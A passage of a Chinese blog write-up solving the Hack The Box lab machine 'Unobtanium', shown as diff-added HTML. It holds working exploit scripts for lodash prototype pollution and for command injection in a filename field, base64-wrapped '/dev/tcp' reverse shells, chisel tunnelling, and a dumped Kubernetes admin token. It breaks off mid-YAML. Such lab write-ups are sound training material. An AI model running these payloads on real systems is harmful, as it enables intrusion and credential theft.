+</code></pre>
+<p>咱们使用burp捕捉一下流量试试</p>
+<img src="/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image5.png" class>
+
+<p>成功让我们查看一下</p>
+<pre><code class="Plain">index.js
+</code></pre>
+<p>的内容</p>
+<img src="/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image6.png" class>
+
+<pre><code class="Plain">{&quot;ok&quot;:true,&quot;content&quot;:&quot;var root = require(\&quot;google-cloudstorage-commands\&quot;);\nconst express = require(&#39;express&#39;);\nconst { exec } = require(\&quot;child_process\&quot;);     \nconst bodyParser = require(&#39;body-parser&#39;);     \nconst _ = require(&#39;lodash&#39;);                                                                  \nconst app = express();\nvar fs = require(&#39;fs&#39;);\n                                                                                              \nconst users = [                                                                               \n  {name: &#39;felamos&#39;, password: &#39;Winter2021&#39;},\n  {name: &#39;admin&#39;, password: Math.random().toString(32), canDelete: true, canUpload: true},      \n];\n\nlet messages = [];                             \nlet lastId = 1;                                \n                                                                                              \nfunction findUser(auth) {                                                                     \n  return users.find((u) =&gt;                                                                    \n    u.name === auth.name &amp;&amp;                                                                   \n    u.password === auth.password);                                                            \n}                                    \n                                               \napp.use(bodyParser.json());                                                                   \n                                               \napp.get(&#39;/&#39;, (req, res) =&gt; {                   \n  res.send(messages);                                                                         \n});                                                                                           \n                                                                                              \napp.put(&#39;/&#39;, (req, res) =&gt; {   \n  const user = findUser(req.body.auth || {});                                                 \n                                               \n  if (!user) {                                 \n    res.status(403).send({ok: false, error: &#39;Access denied&#39;});                                \n    return;\n  }\n\n  const message = {\n    icon: &#39;__&#39;,\n  };\n\n  _.merge(message, req.body.message, {\n    id: lastId++,\n    timestamp: Date.now(),\n    userName: user.name,\n  });\n\n  messages.push(message);\n  res.send({ok: true});\n});\n\napp.delete(&#39;/&#39;, (req, res) =&gt; {\n  const user = findUser(req.body.auth || {});\n\n  if (!user || !user.canDelete) {\n    res.status(403).send({ok: false, error: &#39;Access denied&#39;});\n    return;\n  }\n\n  messages = messages.filter((m) =&gt; m.id !== req.body.messageId);\n  res.send({ok: true});\n});\napp.post(&#39;/upload&#39;, (req, res) =&gt; {\n  const user = findUser(req.body.auth || {});\n  if (!user || !user.canUpload) {\n    res.status(403).send({ok: false, error: &#39;Access denied&#39;});\n    return;\n  }\n\n\n  filename = req.body.filename;\n  root.upload(\&quot;./\&quot;,filename, true);\n  res.send({ok: true, Uploaded_File: filename});\n});\n\napp.post(&#39;/todo&#39;, (req, res) =&gt; {\n\tconst user = findUser(req.body.auth || {});\n\tif (!user) {\n\t\tres.status(403).send({ok: false, error: &#39;Access denied&#39;});\n\t\treturn;\n\t}\n\n\tfilename = req.body.filename;\n        testFolder = \&quot;/usr/src/app\&quot;;\n        fs.readdirSync(testFolder).forEach(file =&gt; {\n                if (file.indexOf(filename) &gt; -1) {\n                        var buffer = fs.readFileSync(filename).toString();\n                        res.send({ok: true, content: buffer});\n                }\n        });\n});\n\napp.listen(3000);\nconsole.log(&#39;Listening on port 3000...&#39;);\n&quot;}
+</code></pre>
+<p>这个格式是真的糟糕，为了方便阅读，我们给它美化一下</p>
+<pre><code class="Plain">var root = require(&quot;google-cloudstorage-commands&quot;);
+const express = require(&#39;express&#39;);
+const { exec } = require(&quot;child_process&quot;);
+const bodyParser = require(&#39;body-parser&#39;);
+const _ = require(&#39;lodash&#39;);
+const app = express();
+var fs = require(&#39;fs&#39;);
+
+const users = [
+ {name: &#39;felamos&#39;, password: &#39;Winter2021&#39;},
+ {name: &#39;admin&#39;, password: Math.random().toString(32), canDelete: true, canUpload: true},
+];
+
+let messages = [];
+let lastId = 1;
+
+function findUser(auth) {
+ return users.find((u) =&gt;
+ u.name === auth.name &amp;&amp;
+ u.password === auth.password);
+}
+
+app.use(bodyParser.json());
+
+app.get(&#39;/&#39;, (req, res) =&gt; {
+ res.send(messages);
+});
+
+app.put(&#39;/&#39;, (req, res) =&gt; {
+ const user = findUser(req.body.auth || {});
+
+ if (!user) {
+ res.status(403).send({ok: false, error: &#39;Access denied&#39;});
+ return;
+ }
+
+ const message = {
+ icon: &#39;__&#39;,
+ };
+
+ _.merge(message, req.body.message, {
+ id: lastId++,
+ timestamp: Date.now(),
+ userName: user.name,
+ });
+
+ messages.push(message);
+ res.send({ok: true});
+});
+
+app.delete(&#39;/&#39;, (req, res) =&gt; {
+ const user = findUser(req.body.auth || {});
+
+ if (!user || !user.canDelete) {
+ res.status(403).send({ok: false, error: &#39;Access denied&#39;});
+ return;
+ }
+
+ messages = messages.filter((m) =&gt; m.id !== req.body.messageId);
+ res.send({ok: true});
+});
+app.post(&#39;/upload&#39;, (req, res) =&gt; {
+ const user = findUser(req.body.auth || {});
+ if (!user || !user.canUpload) {
+ res.status(403).send({ok: false, error: &#39;Access denied&#39;});
+ return;
+ }
+
+ filename = req.body.filename;
+ root.upload(&quot;./&quot;,filename, true);
+ res.send({ok: true, Uploaded_File: filename});
+});
+
+app.post(&#39;/todo&#39;, (req, res) =&gt; {
+        const user = findUser(req.body.auth || {});
+        if (!user) {
+                res.status(403).send({ok: false, error: &#39;Access denied&#39;});
+                return;
+        }
+
+        filename = req.body.filename;
+ testFolder = &quot;/usr/src/app&quot;;
+ fs.readdirSync(testFolder).forEach(file =&gt; {
+ if (file.indexOf(filename) &gt; -1) {
+ var buffer = fs.readFileSync(filename).toString();
+ res.send({ok: true, content: buffer});
+ }
+ });
+});
+
+app.listen(3000);
+console.log(&#39;Listening on port 3000...&#39;);
+</code></pre>
+<p>我们读取文件<code>package.json</code>，得到了</p>
+<pre><code class="Plain">{&quot;ok&quot;:true,&quot;content&quot;:&quot;{\n  \&quot;name\&quot;: \&quot;Unobtainium-Server\&quot;,\n  \&quot;version\&quot;: \&quot;1.0.0\&quot;,\n  \&quot;description\&quot;: \&quot;API Service for Electron client\&quot;,\n  \&quot;main\&quot;: \&quot;index.js\&quot;,\n  \&quot;scripts\&quot;: {\n    \&quot;start\&quot;: \&quot;node index.js\&quot;\n  },\n  \&quot;author\&quot;: \&quot;felamos\&quot;,\n  \&quot;license\&quot;: \&quot;ISC\&quot;,\n  \&quot;dependencies\&quot;: {\n    \&quot;body-parser\&quot;: \&quot;1.18.3\&quot;,\n    \&quot;express\&quot;: \&quot;4.16.4\&quot;,\n    \&quot;lodash\&quot;: \&quot;4.17.4\&quot;,\n    \&quot;google-cloudstorage-commands\&quot;: \&quot;0.0.1\&quot;\n  },\n  \&quot;devDependencies\&quot;: {}\n}\n&quot;}
+</code></pre>
+<p>我们美化一下</p>
+<pre><code class="Plain">{
+  &quot;name&quot;: &quot;Unobtainium-Server&quot;,
+  &quot;version&quot;: &quot;1.0.0&quot;,
+  &quot;description&quot;: &quot;API Service for Electron client&quot;,
+  &quot;main&quot;: &quot;index.js&quot;,
+  &quot;scripts&quot;: {
+    &quot;start&quot;: &quot;node index.js&quot;
+  },
+  &quot;author&quot;: &quot;felamos&quot;,
+  &quot;license&quot;: &quot;ISC&quot;,
+  &quot;dependencies&quot;: {
+    &quot;body-parser&quot;: &quot;1.18.3&quot;,
+    &quot;express&quot;: &quot;4.16.4&quot;,
+    &quot;lodash&quot;: &quot;4.17.4&quot;,
+    &quot;google-cloudstorage-commands&quot;: &quot;0.0.1&quot;
+  },
+  &quot;devDependencies&quot;: {}
+}
+</code></pre>
+<blockquote>
+<p>Lodash<a href="https://snyk.io/vuln/SNYK-JS-LODASH-73638" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-LODASH-73638</a></p>
+</blockquote>
+<blockquote>
+<p>google-cloudstorage-commands<a href="https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431</a></p>
+</blockquote>
+<p>从上面的帮助文档，我发现可以命令注入</p>
+<pre><code class="Plain">#!/bin/bash
+
+RHOST=&quot;unobtainium.htb&quot;
+RPORT=31337
+UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;
+PROXY=&quot;127.0.0.1:8080&quot;
+TEXT=&quot;$1&quot;
+
+cat - &lt;&lt;EOF &gt; message.json
+{
+    &quot;auth&quot;:
+    {
+        &quot;name&quot;:&quot;felamos&quot;,
+        &quot;password&quot;:&quot;Winter2021&quot;
+    },
+    &quot;message&quot;:
+    {
+        &quot;text&quot;:${TEXT}
+    }
+}
+EOF
+
+curl -s \
+     -X PUT \
+     -A &quot;${UA}&quot; \
+     -H &quot;Content-Type: application/json&quot; \
+     -d &quot;$(cat message.json | jq -c)&quot; \
+     -x &quot;${PROXY}&quot; \
+     &quot;http://${RHOST}:${RPORT}/&quot; \
+| jq .
+</code></pre>
+<pre><code class="Plain">(root💀root)-[~/Desktop]
+└─# ./exploit.sh &#39;{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;canDelete&quot;:true, &quot;canUpload&quot;:true}}}&#39;
+{
+  &quot;ok&quot;: true
+}
+</code></pre>
+<p>成功</p>
+<p>这个成功的响应意味着我们真的可以利用这个漏洞，让我们运行脚本2检查是否可以写入文件</p>
+<pre><code class="Plain">#!/bin/bash
+
+RHOST=&quot;unobtainium.htb&quot;
+RPORT=31337
+UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;
+PROXY=&quot;127.0.0.1:8080&quot;
+FILE=&quot;&amp; echo lucifiel | tee lucifiel.txt&quot;
+
+cat - &lt;&lt;EOF &gt; message.json
+{
+    &quot;auth&quot;:
+    {
+        &quot;name&quot;:&quot;felamos&quot;,
+        &quot;password&quot;:&quot;Winter2021&quot;
+    },
+    &quot;filename&quot;:&quot;${FILE}&quot;
+}
+EOF
+
+curl -s \
+     -A &quot;${UA}&quot; \
+     -H &quot;Content-Type: application/json&quot; \
+     -d &quot;$(cat message.json | jq -c)&quot; \
+     -x &quot;${PROXY}&quot; \
+     -o /dev/null \
+     &quot;http://${RHOST}:${RPORT}/upload&quot;
+</code></pre>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# ./exploit2.sh
+</code></pre>
+<p>运行成功，让我们读取</p>
+<pre><code class="Plain">lucifiel.txt
+</code></pre>
+<p>试试是否写入成功</p>
+<img src="/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image7.png" class>
+
+<p>写入成功，现在我们来利用这个漏洞getshell</p>
+<p>首先使用nc监听一个端口</p>
+<pre><code class="Plain">nc -nvlp 4444
+</code></pre>
+<pre><code class="Plain">POST /upload HTTP/1.1
+
+Host: unobtainium.htb:31337
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+Accept: */*
+
+Content-Type: application/json
+
+Content-Length: 151
+
+Connection: close
+
+{&quot;auth&quot;:{&quot;name&quot;:&quot;felamos&quot;,&quot;password&quot;:&quot;Winter2021&quot;},&quot;filename&quot;:&quot;&amp; echo $(echo &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/4444 0&gt;&amp;1&#39; | base64) | base64 -d | bash&quot;}
+</code></pre>
+<p>执行后，成功获得一个shell</p>
+<pre><code class="Plain">┌──(root💀root)-[~/Downloads]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.53] from (UNKNOWN) [10.10.10.235] 58362
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# whoami &amp;&amp; id
+whoami &amp;&amp; id
+root
+uid=0(root) gid=0(root) groups=0(root)
+root@webapp-deployment-5d764566f4-mbprj:/usr/src/app#
+</code></pre>
+<pre><code class="Plain">root@webapp-deployment-5d764566f4-mbprj:~# cd /root
+cd /root
+root@webapp-deployment-5d764566f4-mbprj:~# ls
+ls
+user.txt
+root@webapp-deployment-5d764566f4-mbprj:~# cat user.txt
+cat user.txt
+7ff2ddd449da8a15c66289e2ec015cd9
+</code></pre>
+<p>成功拿到user权限的flag ## 权限提升 我们可以看到，这里的root是在一个docker容器里</p>
+<p>因为没啥思路，让我们先跑一下linpeas吧 </p>
+<blockquote>
+<p><a href="https://github.com/LucifielHack/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh" target="_blank" rel="noopener">https://github.com/LucifielHack/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh</a></p>
+</blockquote>
+<p>使用python3在本地开启一个http服务</p>
+<pre><code class="Plain">python3 -m http.server
+</code></pre>
+<p>然后在shell中使用wget进行下载</p>
+<pre><code class="Plain">wget http://10.10.14.53:8000/linpeas.sh
+</code></pre>
+<p>然后添加权限后运行</p>
+<pre><code class="Plain">chmod +x linpeas.sh
+./linpeas.sh
+</code></pre>
+<p>在结果中看到了一句</p>
+<pre><code class="Plain">* * * * * find / -name kubectl -exec rm {} \;
+* * * * * find / -name kubectl -exec rm {} \;
+</code></pre>
+<p>有一个<code>cronjob</code>正在运行，每分钟删除容器中的<code>kubectl</code></p>
+<p>但是容器中没有<code>kubectl</code>可执行文件</p>
+<p>让我们下载一个<code>kubectl</code>可执行文件并将其传输到<code>/tmp</code>文件夹内的<code>docker</code>中 </p>
+<blockquote>
+<p><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux" target="_blank" rel="noopener">https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux</a></p>
+</blockquote>
+<blockquote>
+<p>在Linux上使用curl安装kubectl二进制文件</p>
+</blockquote>
+<pre><code class="Plain">curl -LO &quot;https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl&quot;
+python3 -m http.server 80
+</code></pre>
+<p>然后在shell中使用wget进行下载</p>
+<pre><code class="Plain">wget http://10.10.14.53/kubectl -o /tmp/kubectl-lucifiel
+cd /tmp/
+chmod +x kubectl-lucifiel
+</code></pre>
+<p>更改一个名字避免被cronjob给删掉</p>
+<p>首先让我们检查一下kubectl</p>
+<pre><code class="Plain">./kubectl-lucifiel get namespace
+./kubectl-lucifiel get pods -n dev
+./kubectl-lucifiel describe pod devnode-deployment-cd86fb5c-6ms8d -n dev
+</code></pre>
+<pre><code class="Plain">root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel get namespace
+&lt;4566f4-h5zhw:/tmp# ./kubectl-lucifiel get namespace
+NAME              STATUS   AGE
+default           Active   180d
+dev               Active   179d
+kube-node-lease   Active   180d
+kube-public       Active   180d
+kube-system       Active   180d
+root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel get pods -n dev
+&lt;66f4-h5zhw:/tmp# ./kubectl-lucifiel get pods -n dev
+NAME                                READY   STATUS    RESTARTS   AGE
+devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         179d
+devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         179d
+devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         179d
+root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel describe pod devnode-deployment-cd86fb5c-6ms8d -n dev
+&lt;scribe pod devnode-deployment-cd86fb5c-6ms8d -n dev
+Name:         devnode-deployment-cd86fb5c-6ms8d
+Namespace:    dev
+Priority:     0
+Node:         unobtainium/10.10.10.235
+Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
+Labels:       app=devnode
+              pod-template-hash=cd86fb5c
+Annotations:  &lt;none&gt;
+Status:       Running
+IP:           172.17.0.8
+IPs:
+  IP:           172.17.0.8
+Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
+Containers:
+  devnode:
+    Container ID:   docker://c22604a2e5d200e2d08b41724e76633954e82ba9d5f4ab201207860f9dc9b91f
+    Image:          localhost:5000/node_server
+    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
+    Port:           3000/TCP
+    Host Port:      0/TCP
+    State:          Running
+      Started:      Fri, 16 Jul 2021 05:11:42 +0000
+    Last State:     Terminated
+      Reason:       Error
+      Exit Code:    137
+      Started:      Wed, 24 Mar 2021 16:01:28 +0000
+      Finished:     Wed, 24 Mar 2021 16:02:13 +0000
+    Ready:          True
+    Restart Count:  28
+    Environment:    &lt;none&gt;
+    Mounts:
+      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
+Conditions:
+  Type              Status
+  Initialized       True
+  Ready             True
+  ContainersReady   True
+  PodScheduled      True
+Volumes:
+  default-token-rmcd6:
+    Type:        Secret (a volume populated by a Secret)
+    SecretName:  default-token-rmcd6
+    Optional:    false
+QoS Class:       BestEffort
+Node-Selectors:  &lt;none&gt;
+Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
+                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
+Events:          &lt;none&gt;
+</code></pre>
+<p>利用方法和前面一样，稍微修改一下脚本</p>
+<pre><code class="Plain">#!/bin/bash
+
+RHOST=&quot;127.0.0.1&quot;
+RPORT=3000
+UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;
+PROXY=&quot;127.0.0.1:8080&quot;
+TEXT=&quot;$1&quot;
+
+cat - &lt;&lt;EOF &gt; message.json
+{
+    &quot;auth&quot;:
+    {
+        &quot;name&quot;:&quot;felamos&quot;,
+        &quot;password&quot;:&quot;Winter2021&quot;
+    },
+    &quot;message&quot;:
+    {
+        &quot;text&quot;:${TEXT}
+    }
+}
+EOF
+
+curl -s \
+     -X PUT \
+     -A &quot;${UA}&quot; \
+     -H &quot;Content-Type: application/json&quot; \
+     -d &quot;$(cat message.json | jq -c)&quot; \
+     -x &quot;${PROXY}&quot; \
+     &quot;http://${RHOST}:${RPORT}/&quot; \
+| jq .
+</code></pre>
+<pre><code class="Plain">#!/bin/bash
+
+RHOST=&quot;127.0.0.1&quot;
+RPORT=3000
+UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;
+PROXY=&quot;127.0.0.1:8080&quot;
+FILE=$1
+
+cat - &lt;&lt;EOF &gt; message.json
+{
+    &quot;auth&quot;:
+    {
+        &quot;name&quot;:&quot;felamos&quot;,
+        &quot;password&quot;:&quot;Winter2021&quot;
+    },
+    &quot;filename&quot;:&quot;${FILE}&quot;
+}
+EOF
+
+curl -s \
+     -A &quot;${UA}&quot; \
+     -H &quot;Content-Type: application/json&quot; \
+     -d &quot;$(cat message.json | jq -c)&quot; \
+     -x &quot;${PROXY}&quot; \
+     -o /dev/null \
+     &quot;http://${RHOST}:${RPORT}/upload&quot;
+</code></pre>
+<p>我们需要使用<code>Chisel</code>将端口转发到<code>devnode-deployment</code>容器<code>“172.17.0.8:3000”</code> </p>
+<blockquote>
+<p>参考视频 <a href="https://www.youtube.com/watch?v=Yp4oxoQIBAM&amp;t=1469s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Yp4oxoQIBAM&amp;t=1469s</a></p>
+</blockquote>
+<blockquote>
+<p>下载地址 <a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">https://github.com/jpillora/chisel</a></p>
+</blockquote>
+<blockquote>
+<p>如果遇到connect: connection refused，解决方案 <a href="https://blog.csdn.net/hhyukJae/article/details/106980818" target="_blank" rel="noopener">https://blog.csdn.net/hhyukJae/article/details/106980818</a></p>
+</blockquote>
+<pre><code class="Plain">命令执行步骤
+go chisel
+du -hs chisel
+go build -ldflags=&quot;-s -w&quot;
+upx brute chisel
+du -hs chisel
+</code></pre>
+<p>然后使用python3开启一个http服务以后，使用wget下载到靶机里</p>
+<p>给chisel一个777权限后，使用chisel开启一个服务</p>
+<pre><code class="Plain">本地运行
+chmod 777 chisel
+./chisel server -p 9999 --reverse
+
+┌──(root💀root)-[~/Desktop/chisel]
+└─# ./chisel server -p 9999 --reverse
+2021/07/17 02:45:18 server: Reverse tunnelling enabled
+2021/07/17 02:45:18 server: Fingerprint kcPnWygZKzUCU+9rAzUk0r6I13LgnEuy/vKZsUNEgCQ=
+2021/07/17 02:45:18 server: Listening on http://0.0.0.0:9999
+</code></pre>
+<pre><code class="Plain">靶机运行
+chmod 777 chisel
+./chisel client 10.10.14.53:9999 R:3000:172.17.0.8:3000
+
+root@webapp-deployment-5d764566f4-mbprj:/tmp# ./chisel client 10.10.14.53:9999 R:3000:172.17.0.8:3000
+&lt;isel client 10.10.14.53:9999 R:3000:172.17.0.8:3000
+2021/07/16 19:04:27 client: Connecting to ws://10.10.14.53:9999
+2021/07/16 19:04:29 client: Connected (Latency 251.63886ms)
+</code></pre>
+<p>然后现在让我们运行修改后的<code>exploit.sh</code></p>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# ./exploit.sh &#39;{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;canDelete&quot;:true, &quot;canUpload&quot;:true}}}&#39;                                                                                                                         4 ⨯
+{
+  &quot;ok&quot;: true
+}
+</code></pre>
+<p>然后运行<code>exploit2.sh</code></p>
+<pre><code class="Plain">./exploit2.sh &quot;&amp; echo $(echo &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/5555 0&gt;&amp;1&#39; | base64) | base64 -d | bash&quot;
+</code></pre>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# nc -nvlp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.53] from (UNKNOWN) [10.10.10.235] 58012
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@devnode-deployment-cd86fb5c-6ms8d:/usr/src/app# whoami &amp;&amp; id
+whoami &amp;&amp; id
+root
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>成功获得另一个shell</p>
+<p>然后我们到<code>/tmp/</code>目录下继续运行<code>kubectl</code>脚本</p>
+<pre><code class="Plain">cd /tmp
+./kubectl-lucifiel get secrets -n kube-system
+
+root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl-lucifiel get secrets -n kube-system
+&lt;/tmp# ./kubectl-lucifiel get secrets -n kube-system
+NAME                                             TYPE                                  DATA   AGE
+attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      180d
+bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      180d
+c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      180d
+certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      180d
+clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      180d
+coredns-token-dbp92                              kubernetes.io/service-account-token   3      180d
+cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      180d
+daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      180d
+default-token-l85f2                              kubernetes.io/service-account-token   3      180d
+deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      180d
+disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      180d
+endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      180d
+endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      180d
+endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      180d
+expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      180d
+generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      180d
+horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      180d
+job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      180d
+kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      180d
+namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      180d
+node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      180d
+persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      180d
+pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      180d
+pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      180d
+pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      180d
+replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      180d
+replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      180d
+resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      180d
+root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      180d
+service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      180d
+service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      180d
+statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      180d
+storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      180d
+token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      180d
+ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      180d
+</code></pre>
+<p>接着让我们获取令牌</p>
+<pre><code class="Plain">./kubectl-lucifiel describe secrets/c-admin-token-tfmp2 -n kube-system
+
+root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl-lucifiel describe secrets/c-admin-token-tfmp2 -n kube-system
+&lt;describe secrets/c-admin-token-tfmp2 -n kube-system
+Name:         c-admin-token-tfmp2
+Namespace:    kube-system
+Labels:       &lt;none&gt;
+Annotations:  kubernetes.io/service-account.name: c-admin
+              kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0
+
+Type:  kubernetes.io/service-account-token
+
+Data
+====
+token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
+ca.crt:     1066 bytes
+namespace:  11 bytes
+</code></pre>
+<p>让我们列出token</p>
+<pre><code class="Plain">root@devnode-deployment-cd86fb5c-6ms8d:/tmp# /tmp/kubectl-lucifiel --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info
+&lt;579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info
+Kubernetes control plane is running at https://10.96.0.1:443
+KubeDNS is running at https://10.96.0.1:443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy
+
+To further debug and diagnose cluster problems, use &#39;kubectl cluster-info dump&#39;.
+</code></pre>
+<p>在本地创建一个<code>lucifiel.yaml</code>脚本</p>
+<pre><code class="Plain">apiVersion: v1
+kind: Pod
+metadata:
+  name: some-pod
+  namespace: default
+spec:
+  containers:
+    - name: web
+      image: localhost:5000/dev-alpine
+      command: [&quot;/bin/sh&quot;]
